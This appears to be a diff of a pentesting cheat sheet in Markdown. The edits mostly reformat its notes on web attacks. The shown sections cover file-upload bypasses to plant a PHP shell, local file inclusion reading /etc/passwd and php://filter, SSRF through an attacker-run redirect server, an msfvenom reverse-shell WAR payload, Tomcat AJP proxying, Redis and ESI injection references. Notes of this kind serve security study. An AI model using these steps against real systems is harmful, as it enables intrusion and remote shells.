@@ -12,10 +12,16 @@ PNG :    89 50 4E 47
 GIF :    47 49 46 38
 ```
 ### Checklist
-- `hexeditor -b shell.php` (for full explanation refer to this article [https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/](https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/))
-- Try double extensions (.php.jpg)
-- Follow [this]([https://www.onsecurity.io/blog/file-upload-checklist/) article and try any other methods that I have not mentioned    
-[(https://www.onsecurity.io/blog/file-upload-checklist/)](https://www.onsecurity.io/blog/file-upload-checklist/)
+```bash
+# Edit the magic bytes (https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/)
+hexeditor -b shell.php
+
+# Try using double extension
+cp shell.php shell.php.jpg
+
+# Other methods (https://www.onsecurity.io/blog/file-upload-checklist)
+```
+
 
 ## Word limits on file upload
 If an image and/or file upload form cannot be broken by the methods described above, try to see if the program puts a limit on the number of characters
@@ -23,8 +29,8 @@ allowed in the file name.
 Hence, try breaking it by testing the name's length.
 
 ### What gives it away?
-- One can only upload a certain file type (no trick to upload other file works)
-    - Find the limit and upload with double extension (.php.png) and the last four chars will get cut off and .php file will be uploaded to grant a shell.
+- One can only upload a certain file type *(no trick to upload other file works)*
+    - Find the limit and upload with double extension *(.php.png)* and the last four chars will get cut off and .php file will be uploaded to grant a shell.
 - Error messages
     - The program outputs an error message that the name has exceeded the character limit.
 
@@ -48,7 +54,7 @@ A bad actor could exploit this and make the following URL:
 `http://site.com?module=/etc/passwd`   
 
 ### Code execution via url and file render
-If the url parameter allows for code to be executed, one might be able to get local resources.
+If the url parameter allows for code to be executed, one might be able to get access to local resources.
 
 ```
 php://filter/convert.base64-encode/resource=<FILE>
@@ -75,25 +81,27 @@ That is because some rules are configured so that they wouldn't look for url enc
 
 
 # SSRF
-Server Side Request Forgery
+Server Side Request Forgery     
 This would occur on a web page that allows for redirects. One could change the header with a proxy to their own server and upload / use their malicious file(s) on the victim's machine.
 ## Procedure
-Make a script to redirect somewhere of your choice
+1. Make a script to redirect somewhere of your choice
 
-```php
-<?php
-header("Location: http://site.com")
-?>
-```
-Start up a local server `php -S <ip>:<port>`    
-Query the script file from the victim site
+    ```php
+    <?php
+    header("Location: http://site.com")
+    ?>
+    ```
+2. Start up a local server 
+    ```bash
+    php -S <ip>:<port>
+    ``` 
+3. Query the script file from the victim site
 
 
 # Redis - Lua sandbox escape vulnerability (CVE-2022-0543)
 **CVE-2022-0543** - Eval command in Redis allows for RCE, hence being able to read files owned by others.
 ## References
 - [https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/#)
-
 
 
 # Flask
@@ -165,12 +173,12 @@ msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 
 ## Apache JServ (AJP) protocol on port 8009
 If a machine hosts a tomcat server with the AJP protocol one can use the steps below to redirect traffic from the host to their machine.
-- Download needed software
+1. Download needed software
     ```bash
     apt install libapache2-mod-jk
     a2enmod proxy_ajp
     ```
-- Configure server
+2. Configure server
     ```bash
     ProxyRequests Off
     <Proxy *>
@@ -181,22 +189,21 @@ If a machine hosts a tomcat server with the AJP protocol one can use the steps b
     ProxyPass   / ajp://<IP>:8009/
     ProxyPassReverse  / ajp://<IP>:8009/
     ```
-- (Re)start apache server
+3.  (Re)start apache server
     ```bash
-    systemctl start apache2 # OR
+    systemctl start apache2 
+    # OR
     systemctl restart apache2
     ```
 
 ### References
 - [https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol](https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol)
-
-
-#### References
 - [https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)
 - [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 
+
 # ESIGate (ESI Injection)
-Any ESIGate software is affected that has a lower version than *5.3*
+Any ESIGate software is affected that has a lower version than **5.3**
 
 ## References
 These are blog posts that consist of 2 parts
